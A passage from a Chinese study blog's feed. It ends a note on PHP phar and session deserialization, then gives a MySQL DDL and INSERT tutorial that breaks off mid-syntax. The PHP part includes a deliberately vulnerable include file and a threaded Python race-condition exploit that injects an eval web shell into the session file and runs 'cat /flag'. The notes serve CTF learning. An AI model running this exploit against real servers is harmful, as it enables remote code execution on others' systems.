?&gt;”);</code> &#x2F;&#x2F;设置stub<br>2、生成一个<code>phar.phar</code>，修改后缀名为<code>phar.gif</code></p><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p> <code>session.upload_progress</code> 来进行利用</p><p>如果没有特别配置的话, session 通常存储在服务器上的某个文件夹中, 并且文件名通常为 <code>sess_&#123;你的SESSION_ID&#125;</code></p><p>由于存储时时通过反序列化, 所以原本的字符串会被保留。于是我们可以注入 PHP 代码, 再通过文件包含执行他</p><p><strong>利用条件:</strong></p><ol><li>可以进行任意文件包含 (或允许包含 session 存储文件)</li><li>知道session文件存放路径，可以尝试默认路径</li><li>具有读取和写入session文件的权限</li></ol><p>若服务器存在文件 test.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以使用类似条件竞争的方法来进行（python示例）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;KW&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>) <span class="comment"># 创建 dummy 数据</span></span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://[ip]/test.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;KW.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; ) <span class="comment"># 注入恶意代码到存储的 SESSION 中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://[ip]/test.php?file=session/sess_&#x27;</span>+sessid,data=data) <span class="comment"># 包含 SESSION 文件, 执行恶意代码</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>如果是反序列化的话, 我们也可以进行反序列化注入</p><p>如果我们的文件名可控, 我们在之前放上 <code>|</code> 表示前面的是键名, 后再写入恶意代码。注意引号要进行转义。</p><p>解析session文件时直接对’|’后的值进行反序列化处理说明：</p><blockquote><p>当会话自动开始或者通过 <code>session_start()</code> 手动开始的时候， <code>PHP</code> 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 <code>PHP</code> 默认的， 也可能是扩展提供的（<code>SQLite</code> 或者 <code>Memcached</code> 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），<code>PHP</code> 会自动反序列化数据并且填充 <code>$_SESSION</code> 超级全局变量。</p></blockquote><p>*注：此处感谢2月22日凌晨0:48:59以后土豆学长的纠正和指导，向他半夜还在改作业的敬业程度致敬！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习笔记</title>
      <link href="/2024/03/03/2024-03-03-MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/03/2024-03-03-MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h2><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>在MySQL中，可以使用<code>CREATE DATABASE</code>或<code>CREATE SCHEMA</code>语句创建数据库</p><h4 id="语法格式："><a href="#语法格式：" class="headerlink" title="语法格式："></a>语法格式：</h4><p><code>db_name</code> 数据库命名</p><p><code>CHARACTER SET</code> 指定字符集</p><p><code>COLLATE</code> 指定字符集的校对规则</p><p><code>IF NOT EXISTS</code> MySQL不允许同一个系统使用2个数据库相同的名字，因此需要加上IF NOT EXISTS从句，可避免错误的发生。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE [IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] db_name <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name <span class="keyword">COLLATE</span> <span class="keyword">collation</span> name;</span><br></pre></td></tr></table></figure><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>创建一个名字为<code>blog</code>的数据库，指定字符集为<code>utf8mb4</code>(关键字：<code>CHARACTER SET</code>)，指定字符集的校对规则(关键字：<code>COLLATE</code>)，加上从句<code>IF NOT EXISTS</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> blog <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br></pre></td></tr></table></figure><h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><p>在MySQL中，使用<code>USE</code>语句可以实现一个数据库“跳转”到另外一个数据库，在使用<code>CREATE DATABASE</code> 语句创建了数据库之后，该数据库不会自动成为当前数据库，需要用<code>USE</code>语句来指定，其语法是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE db_name;</span><br></pre></td></tr></table></figure><p>只有使用<code>USE</code>命令指定某个数据库为当前的数据库之后，才能对该数据库及其存储的数据对象执行各种的后续操作。</p><h3 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h3><p>在MySQL中，可以使用<code>ALTER DATABASE</code>或<code>ALTER SCHEMA</code>语句来修改已经被创建的数据库的相关参数，其语法是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> &#123;DATABASE <span class="operator">|</span> SCHEMA&#125; [db_name] alter_specification ...</span><br></pre></td></tr></table></figure><p>实例：</p><p>修改已有数据库<code>blog</code>的默认字符集和校对规则</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> DATABASE blog <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">DEFAULT</span> <span class="keyword">COLLATE</span> utf8_general_ci;</span><br></pre></td></tr></table></figure><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><p>在MySQL中，当需要删除已创立的数据库时，可以使用<code>DROP DATABASE</code>或 <code>DROP SCHEMA</code>语句进行删除，其语法格式是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> &#123;DATABASE <span class="operator">|</span> SCHEMA&#125; [IF <span class="keyword">EXISTS</span>] db_name;</span><br></pre></td></tr></table></figure><p>实例：</p><p>删除名字为<code>blog</code>的数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> blog;</span><br></pre></td></tr></table></figure><p>选项<code>IF EXISTS</code>可以避免删除不存在的数据库时出现MySQL错误的信息，另外特别注意：使用<code>DROP DATABASE</code>或<code>DROP SCHEMA</code>语句会删除指定的整个数据库，该数据库中的所有表包括其数据也将永久删除，因此使用该语句时候，需要谨慎，以免错误删除。</p><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><p>在MySQL中，可以使用<code>SHOW DATABASES</code>或 <code>SHOW SCHEMAS</code>语句查看可用的数据库列表，其语法是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> &#123;DATABASES <span class="operator">|</span> SCHEMAS&#125; [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span>]</span><br></pre></td></tr></table></figure><p>此选项中“<code>LIKE</code>”关键字用于匹配指定的数据库名称</p><p>查看当前数据库编码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE db_name;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br><span class="line"><span class="keyword">SHOW</span> DATABASES <span class="keyword">LIKE</span> &quot;blog&quot;;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE blog;</span><br></pre></td></tr></table></figure><h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p>在MySQL中，可以使用<code>CREATE TABLE</code>语句创建表。</p><h5 id="语法格式：-1"><a href="#语法格式：-1" class="headerlink" title="语法格式："></a>语法格式：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl_name(字段名<span class="number">1</span> 数据类型 [列级完整性约束条件][默认值],字段名<span class="number">2</span> 数据类型 [列级完整性约束条件][默认值],[...][, 表级完整性约束条件])[ENGINE<span class="operator">=</span>引擎类型];</span><br></pre></td></tr></table></figure><h5 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h5><p>在已有数据库 blog 中新建一个包含客户姓名，性别，地址，联系方式等内容的客户基本信息表，要求将客户的id号设置为该表的主键。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">USE blog;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> customers(</span><br><span class="line">cust_id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;主键(自增长)&#x27;</span>,</span><br><span class="line">cust_name <span class="type">CHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;客户姓名&#x27;</span>,</span><br><span class="line">cust_sex tinyint(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span> COMMENT <span class="string">&#x27;客户性别 1-男，2-女&#x27;</span>,</span><br><span class="line">cust_address <span class="type">CHAR</span>(<span class="number">50</span>) <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;客户地址&#x27;</span>,</span><br><span class="line">cust_contact <span class="type">CHAR</span>(<span class="number">50</span>) <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;客户联系方式&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY(cust_id)</span><br><span class="line">)COMMENT <span class="operator">=</span> <span class="string">&#x27;客户表&#x27;</span> ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br></pre></td></tr></table></figure><h5 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h5><ul><li><p>数据类型 ：系统中所允许的数据的类型。整形<code>int</code>，浮点型<code>double</code>，布尔型<code>bool</code>，日期和时间类型<code>date</code>，时间戳<code>timestamp</code>，时间型<code>time</code>，字符串类型<code>char</code>，可变长字符串型<code>varchar</code>，空间数据类型等</p></li><li><p><code>AUTO_INCREMENT</code>：表示为数据类型为整形的列设置自增属性，从而能实现当插入数据时候，该列的值会被自动设置为“当前表中该列的最大值加1”。</p></li><li><p><code>DEFAULT</code>：指定默认值，插入数据库时，如果没有明确给出某列的所对应的值，则<code>DBMS</code>此时允许为此列表指定的一个值。</p></li><li><p><code>NULL</code>：<code>NULL</code> 值是指没有值或缺值，设置<code>NULL</code>允许插入时，可以允许不给出该列的值，该值默认<code>NULL</code>，如果设置<code>NOT NULL</code>，那么在插入或更新的时候，该列必须要有值。</p></li><li><p><code>PRIMARY</code>：主键，主键值必须唯一，即表中每个行必须要具有唯一的主键值，而且主键值一定要设置为<code>NOT NULL</code></p></li><li><p><code>COMMENT</code> 添加注释，方便日后查看或别的伙伴看到你的代码清晰知道其意</p></li></ul><h3 id="更新表"><a href="#更新表" class="headerlink" title="更新表"></a>更新表</h3><p>创建MySQL表后，有时需要对创建的表的结构进行修改或调整，可以使用ALTER TABLE语句来更改原有的表结构，例如可以修改表的增加或删除列，创建或取消索引，更改原有列的数据类型，重新命名列或表，还可以更改表的评注和表的引擎类型</p><h4 id="新增列"><a href="#新增列" class="headerlink" title="新增列"></a>新增列</h4><p>如果需要向表增加新列，可以使用 <code>ALTER TABLE</code> 语句中添加 <code>ADD [COLUMN]</code> 子句来实现，也可以同时增加多个列。</p><p>需求：</p><p>向数据库 <code>blog</code> 的表的 <code>customers</code>中添加一列，并命名为 <code>cust_city</code>，用于表述客户所在的城市，要求其不能为<code>NULL</code>，默认值为字符串<code>’GuangZHou’</code>，且位于原表的<code>cust_sex</code>列之后。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> cust_city <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;GuangZhou&#x27;</span> AFTER cust_sex;</span><br></pre></td></tr></table></figure><h4 id="修改表中的列的名称或数据类型"><a href="#修改表中的列的名称或数据类型" class="headerlink" title="修改表中的列的名称或数据类型"></a>修改表中的列的名称或数据类型</h4><p>如果想修改表中的名称或数据类型，可以在 <code>ALTER TABLE</code> 语句中添加 <code>CHANGE [COLUMN]</code> 子句。</p><p><code>CHANGE [COLUMN]</code> 子句可同时修改指定列的名称和数据类型，且在<code>ALTER TABLE</code> 语句中同时放入多个<code>CHANGE [COLUMN]</code>子句，只需彼此之间用逗号分隔。</p><p>实例：</p><p>将数据库<code>blog</code>中表的<code>customers</code>的<code>cust_sex</code>列重命名为<code>sex</code>，且将其数据类型更改为字符长度为1的字符数据类型<code>char(1)</code>，允许其为<code>NULL</code>，默认值为字符常量<code>’M’</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers CHANGE <span class="keyword">COLUMN</span> cust_sex sex <span class="type">CHAR</span>(<span class="number">1</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;M&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="修改或删除表中指定的默认值"><a href="#修改或删除表中指定的默认值" class="headerlink" title="修改或删除表中指定的默认值"></a>修改或删除表中指定的默认值</h4><p>修改或删除表中指定的默认值，可在<code>ALTER TABLE</code> 语句中添加 <code>ALTER [COLUMN]</code>子句。</p><p>实例：</p><p>将数据库 <code>blog</code> 中表 <code>customers</code> 的<code>cust_city</code> 列的默认值修改为字符常量’<code>Beijing</code>’:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> cust_city <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;Beijing&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="修改指定列的数据类型"><a href="#修改指定列的数据类型" class="headerlink" title="修改指定列的数据类型"></a>修改指定列的数据类型</h4><p><code>MODIFY [COLUMN]</code>与<code>CHANGE [COLUMN]</code> 有所不同，在<code>ALTER TABLE</code> 语句中添<code>MODIFY [COLUMN]</code>子句只会修改指定列的数据类型，不会干涉他的列名，另外还可以通过关键字<code>FIRST</code>或<code>AFTER</code>修改指定列表中的位置。</p><p>实例：</p><p>将数据库 <code>blog</code> 中表<code>customers</code>中的<code>cust_name</code>列的数据类型由之前的字符串长度为50的定长字符数据类型<code>char(50)</code>更改为字符长度为20的定长字符数据类型<code>char(20)</code>，并且将此列设置为第一列。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers MODIFY <span class="keyword">COLUMN</span> cust_name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">FIRST</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers MODIFY <span class="keyword">COLUMN</span> cust_name <span class="type">char</span>(<span class="number">20</span>) AFTER cust_id;</span><br></pre></td></tr></table></figure><h4 id="删除数据表列"><a href="#删除数据表列" class="headerlink" title="删除数据表列"></a>删除数据表列</h4><p>通过<code>ALTER TABLE</code>语句中添加<code>DROP [COLUMN]</code>子句来完成操作，一旦执行删除操作后，</p><p>原本储存的一切内容会跟着被卸除，所以执行该命令需要谨慎。</p><p>实例：</p><p>删除数据库<code>blog</code> 中表<code>customers</code>的<code>cust_contact</code>列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> cust_contact;</span><br></pre></td></tr></table></figure><h4 id="重命名表-ALTER"><a href="#重命名表-ALTER" class="headerlink" title="重命名表-ALTER"></a>重命名表-ALTER</h4><p>在 <code>ALTER TABLE</code>语句中，可以添加<code>RENAME[TO]</code>子句为表重新赋予一个表名字</p><p>实例：</p><p>使用<code>RENAME [TO]</code>子句，重命名数据库 <code>blog</code> 中表 <code>customers</code>的表名为<code>backup_customers</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> blog.customers RENAME <span class="keyword">TO</span> blog.backup_customers;</span><br></pre></td></tr></table></figure><h4 id="重命名表-RENAME"><a href="#重命名表-RENAME" class="headerlink" title="重命名表-RENAME"></a>重命名表-RENAME</h4><p>使用<code>RENAME TABLE</code>语句来更改表的名字，并且可以同时命名多个表，其语法是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RENAME <span class="keyword">TABLE</span> tbl_name <span class="keyword">TO</span> new_tbl_name [, tbl_name2 <span class="keyword">TO</span> new_tbl_name2] ..</span><br></pre></td></tr></table></figure><p>实例：</p><p>把数据库<code>blog</code>的<code>backup_customers</code>表改名为<code>new_customers</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RENAME <span class="keyword">TABLE</span> blog.backup_customers <span class="keyword">TO</span> blog.new_customers;</span><br></pre></td></tr></table></figure><h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><p>如果需要删除数据库中的一个存在的表，可以通过 <code>DROP TABLE</code>语句来实现，其语法是:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> [TEMPORARY] <span class="keyword">TABLE</span> [IF <span class="keyword">EXISTS</span>] tbl_name [, tbl_name2] .. [RESTRICT <span class="operator">|</span> CASCADE]</span><br></pre></td></tr></table></figure><p>实例:</p><p>删除数据库<code>blog</code>的<code>new_customers</code>表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> new_customers;</span><br></pre></td></tr></table></figure><h4 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h4><p>在数据库中，查看表包括显示表的名称和结构的2种情况。</p><h5 id="显示表的名称"><a href="#显示表的名称" class="headerlink" title="显示表的名称"></a>显示表的名称</h5><p>在MySQL中，可以使用<code>SHOW TABLES</code>语句来显示指定数据库中存放的所有表名，其语法是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> [<span class="keyword">FULL</span>] TABLES [&#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; db_name]</span><br></pre></td></tr></table></figure><p>实例：</p><p>显示数据库<code>blog</code>中的所有表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE blog;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure><h5 id="显示表的结构"><a href="#显示表的结构" class="headerlink" title="显示表的结构"></a>显示表的结构</h5><p>在mysql中，可以使用 <code>SHOW COLUMNS</code> 语句来显示指定数据表的结构，其语法格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> [<span class="keyword">FULL</span>] COLUMNS &#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; tbl_name [&#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; db_name] [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span> <span class="operator">|</span> <span class="keyword">WHERE</span> expr]</span><br></pre></td></tr></table></figure><p>或者使用<code>DESCRIBE</code> 语句来完成，其语法格式为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DESCRIBS <span class="operator">|</span> <span class="keyword">DESC</span>&#125; tbl_name [col_name <span class="operator">|</span> wild]</span><br></pre></td></tr></table></figure><p>实例：</p><p>显示数据库blog中表的<code>customers</code>的结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DESC</span> blog.customers;</span><br></pre></td></tr></table></figure><h5 id="查看表编码"><a href="#查看表编码" class="headerlink" title="查看表编码"></a>查看表编码</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl_name;</span><br></pre></td></tr></table></figure><h5 id="查看字段编码"><a href="#查看字段编码" class="headerlink" title="查看字段编码"></a>查看字段编码</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">FULL</span> COLUMNS <span class="keyword">FROM</span> tbl_name;</span><br></pre></td></tr></table></figure><h2 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h2><p>数据更新操作有三种：向表中添加若干行数据，修改表中的数据，和删除表中的若干行数据，在SQL中有三类相对应的语句，分别是插入数据<code>INSERT</code>，修改数据<code>UPDATE</code>和删除数据<code>DELETE</code>。</p><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p>在MySQL中，可以使用<code>INSERT</code>语句，向数据库中一个已有的表插入一行或多行元组数据。</p><p><code>INSERT</code>语句有2种语法形式，分别是：</p><ul><li><p>INSERT..VALUES</p></li><li><p>INSERT..SET</p></li></ul><h4 id="使用INSERT-VALUES语句插入单行或多行元组数据"><a href="#使用INSERT-VALUES语句插入单行或多行元组数据" class="headerlink" title="使用INSERT..VALUES语句插入单行或多行元组数据"></a>使用INSERT..VALUES语句插入单行或多行元组数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> [<span class="keyword">INTO</span>] tbl_name [(col_name, ...)] &#123;<span class="keyword">VALUES</span> <span class="operator">|</span> <span class="keyword">VALUE</span>&#125; (&#123;expr <span class="operator">|</span> <span class="keyword">DEFAULT</span>&#125;),(...),,,</span><br></pre></td></tr></table></figure><p>实例：</p><p>向数据库<code>blog</code>的表<code>customers</code>中插入一行完整数据：<code>1, ‘梁凤波’, 1, ‘广州市’, ‘越秀区’</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog.customers <span class="keyword">VALUES</span>(<span class="number">1</span>, <span class="string">&#x27;梁凤波&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;广州市&#x27;</span>, <span class="string">&#x27;越秀区&#x27;</span>);</span><br></pre></td></tr></table></figure><p>使用<code>INSERT .. VALUES</code>语句向数据库<code>blog</code>的表<code>customers</code>插入一行数据，<code>cust_id</code>列由系统自动生成，<code>cust_sex</code>列选用表中默认值，另外<code>cust_contact</code>列值不确定，可不用确定。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog.customers <span class="keyword">VALUES</span>(<span class="number">0</span>, <span class="string">&#x27;Lynn&#x27;</span>, <span class="keyword">DEFAULT</span>, <span class="string">&#x27;深圳市&#x27;</span>, <span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure><p>插入时候，每个列必须提供一个值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog.customers(cust_id, cust_name, cust_sex, cust_address, cust_contact) <span class="keyword">VALUES</span>(<span class="number">0</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;广州市&#x27;</span>, <span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure><h4 id="使用INSERT-SET语句插入部分列值的数据"><a href="#使用INSERT-SET语句插入部分列值的数据" class="headerlink" title="使用INSERT .. SET语句插入部分列值的数据"></a>使用INSERT .. SET语句插入部分列值的数据</h4><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 